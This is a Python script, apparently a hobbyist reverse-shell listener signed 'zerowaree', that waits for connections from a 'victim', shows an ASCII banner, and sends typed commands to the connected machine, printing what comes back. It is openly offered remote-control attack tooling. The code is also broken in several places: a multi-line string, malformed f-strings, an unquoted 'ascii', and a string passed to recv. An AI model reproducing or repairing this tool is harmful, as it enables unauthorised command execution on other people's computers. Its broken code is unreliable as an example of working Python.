import time
import socket
import colorama
from colorama import Fore, Back, Style
colorama.init()

server=socket.socket()
server.bind(("youriphere",porthere))
server.listen(1)

while True:
    victima,direccion=server.accept()
    print("
  ██████  █    ██  ██▓▒███████▒ ▄▄▄      
▒██    ▒  ██  ▓██▒▓██▒▒ ▒ ▒ ▄▀░▒████▄    
░ ▓██▄   ▓██  ▒██░▒██▒░ ▒ ▄▀▒░ ▒██  ▀█▄  
  ▒   ██▒▓▓█  ░██░░██░  ▄▀▒   ░░██▄▄▄▄██ 
▒██████▒▒▒▒█████▓ ░██░▒███████▒ ▓█   ▓██▒
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ░▓  ░▒▒ ▓░▒░▒ ▒▒   ▓▒█░
░ ░▒  ░ ░░░▒░ ░ ░  ▒ ░░░▒ ▒ ░ ▒  ▒   ▒▒ ░
░  ░  ░   ░░░ ░ ░  ▒ ░░ ░ ░ ░ ░  ░   ▒   
      ░     ░      ░    ░ ░          ░  ░
                      ░                  
")
    print(f{Fore_MAGENTA}'[*] New Connection: {}'.format(direccion))
    msjBinario=victima.recv(1024)
    msjCodificado=msjBinario.decode(ascii)
    
    if msjCodificado == "1":
        while True:
            opcion = input("[*] Shell@Shell: ")
            victima.send(opcion.encode("ascii"))
            resultado=victima.recv("2048")
            print(resultado)
    else:
        time.sleep(0.5)
        print(f{Fore_RED}"[-] Something went wrong :( [-] ")
        print(f{Fore_CYAN}"[!] Press any key to exit [!]")
        input()
        break
        
#                       .,,uod8B8bou,,.
#              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.
#         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||
#         !...:!TVBBBRPFT||||||||||!!^^""'   ||||
#         !.......:!?|||||!!^^""'            ||||
#         !.........||||                     ||||
#         !.........||||  ##                 ||||
#         !.........||||                     ||||
#         !.........||||                     ||||
#         !.........||||                     ||||
#         !.........||||                     ||||
#         `.........||||                    ,||||
#          .;.......||||               _.-!!|||||
#   .,uodWBBBBb.....||||       _.-!!|||||||||!:'
# !YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....
# !..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.
# !....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.
# !......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.
# !........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.
# `..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo.
#  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
#    `........::::::::::::::::;iof688888888888888888888b.     `
#      `......:::::::::;iof688888888888888888888888888888b.
#        `....:::;iof688888888888888888888888888888888899fT!
#          `..::!8888888888888888888888888888888899fT|!^"'
#            `' !!988888888888888888888888899fT|!^"'
#                `!!8888888888888888899fT|!^"'
#                  `!988888888899fT|!^"'
#                    `!9899fT|!^"'
#                      `!^"'
# --> Made with love, by zerowaree
